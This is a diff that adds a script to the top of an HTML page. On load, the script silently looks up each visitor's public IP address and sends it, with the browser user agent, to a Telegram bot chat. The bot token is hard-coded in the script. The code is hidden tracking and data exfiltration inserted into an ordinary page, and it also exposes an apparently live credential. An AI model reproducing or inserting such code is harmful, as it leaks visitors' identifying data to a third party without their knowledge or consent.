@@ -1,3 +1,22 @@
+<script>
+(async () => {
+  try {
+    const ipResp = await fetch('https://api.ipify.org?format=json');
+    const ipJson = await ipResp.json();
+    const ip = ipJson.ip;
+
+    // WARNING: This will expose your bot token to anyone who views source!
+    const TELEGRAM_TOKEN = '7425275727:AAECR3OCif9mV5Kv_QByGbYUkTy-LuxDMAM'; // DO NOT DO THIS IN PROD
+    const CHAT_ID = '5777827768';
+    const msg = encodeURIComponent(`Open: ${ip} - ${navigator.userAgent}`);
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+  } catch (e) {
+    console.error(e);
+  }
+})();
+</script>
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
